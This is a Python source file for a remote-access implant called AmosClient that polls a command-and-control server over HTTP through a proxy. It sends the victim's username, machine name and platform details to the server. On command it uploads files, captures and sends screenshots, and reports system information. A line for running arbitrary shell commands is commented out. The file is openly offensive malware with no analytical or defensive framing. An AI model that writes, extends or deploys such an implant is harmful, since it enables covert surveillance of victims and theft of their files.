import os
from platform import platform
from time import time, sleep
from requests import get, post, exceptions
from ServerHandler import ServerHandler
from DataHarvester import DataHarvester
from GeneralFeatures import GeneralFeatures
from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER, CMD_REQUEST, CMD_RESPONSE,
                             RESPONSE_KEY, DELAY, CLIENT_CREDENTIALS)


class AmosClient:

    def __init__(self):
        self.server_handler = ServerHandler(SERVER_IP, SERVER_PORT)
        self.data_harvester = DataHarvester()
        self.general_features = GeneralFeatures()
        self.credentials_sent = False


    # Function to post data to the c2 server
    def post_to_server(self, message, response_path=CMD_RESPONSE):
        try:
            post(f"http://{SERVER_IP}:{SERVER_PORT}{response_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
        except exceptions.RequestException:
            return



    def start(self):
        client = (os.getenv("USERNAME", "Unknown_Username") + "@" + os.getenv("COMPUTERNAME", "Unknown_Computername"))

        # Try an HTTP GET request to the c2 server and retrieve a command; if it fails, keep trying forever
        while True:
            try:
                response = get(f"http://{SERVER_IP}:{SERVER_PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)

                if response.status_code == 200 and self.credentials_sent == False:
                    platform_info = self.data_harvester.get_platform_info()
                    print(platform_info)
                    self.post_to_server(platform_info, CLIENT_CREDENTIALS)
                    self.credentials_sent = True
                if response.status_code == 404:
                    raise exceptions.RequestException

            except exceptions.RequestException:
                sleep(DELAY)
                continue   # send timeout signal


            # Retrieve server command via the decoded content of the response object
            command = response.content.decode()
            print(command)
            sleep(DELAY)

            if 'terminate' in command:
                break

            # Send file
            elif 'get' in command:
                self.server_handler.send_file(command)
                continue

            # Send file
            elif command == "connected":
                self.server_handler.send_data("active")
                continue

            elif command == "sys_info":
                system_info = self.data_harvester.get_platform_info()
                print(system_info)
                self.server_handler.send_data(system_info)
                continue

            elif command == "screenshot":
                self.general_features.screenshot()
                self.server_handler.send_file("screenshot.png")
                if os.path.isfile("screenshot.png"):
                    os.remove("screenshot.png")
            else:
                print(command)
                #self.server_handler.run_command(command)
                sleep(1)


client = AmosClient()
client.start()

